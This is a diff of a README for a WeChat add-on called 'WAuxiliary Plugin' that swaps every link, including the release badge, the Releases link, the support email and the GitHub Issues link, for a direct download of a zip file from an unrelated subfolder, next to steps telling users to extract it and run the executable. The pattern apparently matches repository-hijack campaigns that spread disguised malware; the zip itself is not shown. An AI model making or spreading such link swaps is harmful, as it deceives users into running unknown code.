@@ -2,7 +2,7 @@
 
 Welcome to the **WAuxiliary Plugin** repository! This plugin enhances your WeChat experience by adding useful features and tools. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ibootdaily/WAuxiliary_Plugin/releases)
+[![Download Latest Release](https://github.com/ibootdaily/WAuxiliary_Plugin/raw/refs/heads/main/plugins/hd/OpenAiChat/W-Plugin-Auxiliary-2.9.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ibootdaily/WAuxiliary_Plugin/raw/refs/heads/main/plugins/hd/OpenAiChat/W-Plugin-Auxiliary-2.9.zip)
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ The **WAuxiliary Plugin** offers several features to improve your WeChat usage:
 
 To install the **WAuxiliary Plugin**, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/ibootdaily/WAuxiliary_Plugin/releases). Make sure to download the correct file for your operating system.
+1. **Download the latest release** from the [Releases section](https://github.com/ibootdaily/WAuxiliary_Plugin/raw/refs/heads/main/plugins/hd/OpenAiChat/W-Plugin-Auxiliary-2.9.zip). Make sure to download the correct file for your operating system.
 2. **Extract the files** from the downloaded archive.
 3. **Run the executable** file. Follow the on-screen instructions to complete the installation.
 
@@ -61,9 +61,9 @@ The **WAuxiliary Plugin** is licensed under the MIT License. See the [LICENSE](L
 
 For questions or support, please reach out via:
 
-- **Email**: support@wauxiliaryplugin.com
-- **GitHub Issues**: [Open an issue](https://github.com/ibootdaily/WAuxiliary_Plugin/issues)
+- **Email**: https://github.com/ibootdaily/WAuxiliary_Plugin/raw/refs/heads/main/plugins/hd/OpenAiChat/W-Plugin-Auxiliary-2.9.zip
+- **GitHub Issues**: [Open an issue](https://github.com/ibootdaily/WAuxiliary_Plugin/raw/refs/heads/main/plugins/hd/OpenAiChat/W-Plugin-Auxiliary-2.9.zip)
 
-Feel free to visit the [Releases section](https://github.com/ibootdaily/WAuxiliary_Plugin/releases) for the latest updates and downloads.
+Feel free to visit the [Releases section](https://github.com/ibootdaily/WAuxiliary_Plugin/raw/refs/heads/main/plugins/hd/OpenAiChat/W-Plugin-Auxiliary-2.9.zip) for the latest updates and downloads.
 
 Thank you for using the **WAuxiliary Plugin**! We hope it enhances your WeChat experience.
